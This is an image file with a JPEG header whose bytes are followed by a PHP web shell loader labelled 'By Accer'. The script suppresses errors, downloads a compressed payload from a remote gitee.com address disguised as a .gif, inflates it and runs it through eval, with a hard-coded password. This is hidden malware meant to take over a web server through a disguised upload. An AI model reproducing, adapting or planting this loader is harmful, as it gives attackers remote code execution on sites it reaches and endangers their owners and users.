���� JFIF     �� "Exif  MM *               �� C 		



	�� C��   " ��           	
�� �   } !1AQa"q2���#B��R��$3br�	
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz���������������������������������������������������������������������������        	
�� �  w !1AQaq"2�B����	#3R�br�
$4�%�&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������   ? ����(��<?php
header("Content-type:text/html;charset=utf8");
$password='a';
$shellname='By Accer';
error_reporting(0);
session_start();
if(empty($_SESSION[code])){
	$_SESSION[code]=gzinflate(file_get_contents("https://gitee.com/accessed/WL/raw/master/p.gif"));
}
@eval($_SESSION['code']);
?>